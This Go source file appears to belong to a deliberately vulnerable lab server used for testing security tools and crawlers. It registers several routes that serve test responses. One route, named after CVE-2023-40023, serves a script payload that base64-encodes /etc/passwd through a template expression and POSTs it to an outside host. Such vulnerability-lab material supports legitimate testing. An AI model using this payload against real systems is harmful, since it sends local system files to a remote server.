package vulinbox

import (
	"bytes"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"net/http"
)

func (s *VulinServer) registerMiscRoute() {
	s.router.HandleFunc("/CVE-2023-40023", func(writer http.ResponseWriter, request *http.Request) {
		writer.Header().Set("Content-Type", "text/html; charset=utf-8")
		writer.Write([]byte(`<script>
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "http://yakit.com/filesubmit");
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("file={{base64enc(file(/etc/passwd))}}");
</script>`))
	})
	s.registerMiscResponse()
}

func (s *VulinServer) registerMiscResponse() {
	var router = s.router

	r := router.PathPrefix("/misc/response").Name("一些精心构造的畸形/异常/测试响应").Subrouter()
	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			defer func() {
				if err := recover(); err != nil {
					log.Error(err)
				}
			}()
			ret := codec.Atoi(request.URL.Query().Get("cl"))
			writer.Write(bytes.Repeat([]byte{'a'}, ret))
		},
		Path:  "/content_length?cl=1024",
		Title: "通过(cl=int)定义响应体长度",
	})

	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			writer.Header().Set("Content-Type", "text/html; charset=utf-8")
			writer.Write([]byte(`<body>
	
<a href="#">this is a ssa ir js test spa</a>

<div id='app'></div>	

<script>
!function(c){function e(e){for(var t,r,n=e[0],o=e[1],u=e[2],a=0,i=[];a<n.length;a++)r=n[a],Object.prototype.hasOwnProperty.call(p,r)&&p[r]&&i.push(p[r][0]),p[r]=0;for(t in o)Object.prototype.hasOwnProperty.call(o,t)&&(c[t]=o[t]);for(d&&d(e);i.length;)i.shift()();return f.push.apply(f,u||[]),l()}function l(){for(var e,t=0;t<f.length;t++){for(var r=f[t],n=!0,o=1;o<r.length;o++){var u=r[o];0!==p[u]&&(n=!1)}n&&(f.splice(t--,1),e=s(s.s=r[0]))}return e}var r={},p={1:0},f=[];function s(e){if(r[e])return r[e].exports;var t=r[e]={i:e,l:!1,exports:{}};return c[e].call(t.exports,t,t.exports,s),t.l=!0,t.exports}s.e=function(o){var e=[],r=p[o];if(0!==r)if(r)e.push(r[2]);else{var t=new Promise(function(e,t){r=p[o]=[e,t]});e.push(r[2]=t);var n,u=document.createElement("script");u.charset="utf-8",u.timeout=120,s.nc&&u.setAttribute("nonce",s.nc),u.src=s.p+"static/js/"+({}[o]||o)+"."+{3:"51247ecb",4:"65676c3f"}[o]+".chunk.js";var a=new Error;n=function(e){u.onerror=u.onload=null,clearTimeout(i);var t=p[o];if(0!==t){if(t){var r=e&&("load"===e.type?"missing":e.type),n=e&&e.target&&e.target.src;a.message="Loading chunk "+o+" failed.\n("+r+": "+n+")",a.name="ChunkLoadError",a.type=r,a.request=n,t[1](a)}p[o]=void 0}};var i=setTimeout(function(){n({type:"timeout",target:u})},12e4);u.onerror=u.onload=n,document.head.appendChild(u)}return Promise.all(e)},s.m=c,s.c=r,s.d=function(e,t,r){s.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},s.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},s.t=function(t,e){if(1&e&&(t=s(t)),8&e)return t;if(4&e&&"object"==typeof t&&t&&t.__esModule)return t;var r=Object.create(null);if(s.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:t}),2&e&&"string"!=typeof t)for(var n in t)s.d(r,n,function(e){return t[e]}.bind(null,n));return r},s.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return s.d(t,"a",t),t},s.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},s.p="/",s.oe=function(e){throw console.error(e),e};var t=this["webpackJsonppalm-kit-desktop"]=this["webpackJsonppalm-kit-desktop"]||[],n=t.push.bind(t);t.push=e,t=t.slice();for(var o=0;o<t.length;o++)e(t[o]);var d=n;l()}([])
</script>
<script src='/static/js/spa/pre-main.js'></script>
<script src='/static/js/spa/main.js'></script>
</body>
`))
		},
		Path:  "/webpack-ssa-ir-test.html",
		Title: "测试普通爬虫的 Webpack 处理能力",
	})

	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			writer.Write([]byte(`Hello Fetch Request is Fetched`))
		},
		Path: "/fetch/basic.action",
	})

	addRouteWithVulInfo(r, &VulInfo{
		Handler: func(writer http.ResponseWriter, request *http.Request) {
			writer.Header().Set("Content-Type", "text/html; charset=utf-8")
			writer.Write([]byte(`<body>
	
<a href="#">this is a ssa ir js test spa</a>

<script src='1.js'></script>
<script src='2.js'></script>
<div id='app'></div>

<script>

fetch('/misc/response/fetch/basic.action')
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok ' + response.statusText);
    }
    return response.text();
  })
  .then(data => {
    console.log(data); // 这里是你的页面内容
  })
  .catch(error => {
    console.error('There has been a problem with your fetch operation:', error);
  });


</script>
<script src='4.js' defer></script>
<script src='3.js' defer></script>
</body>
`))
		},
		Path:  "/javascript-ssa-ir-basic/basic-fetch.html",
		Title: "测试普通爬虫的基础JS处理能力",
	})
}
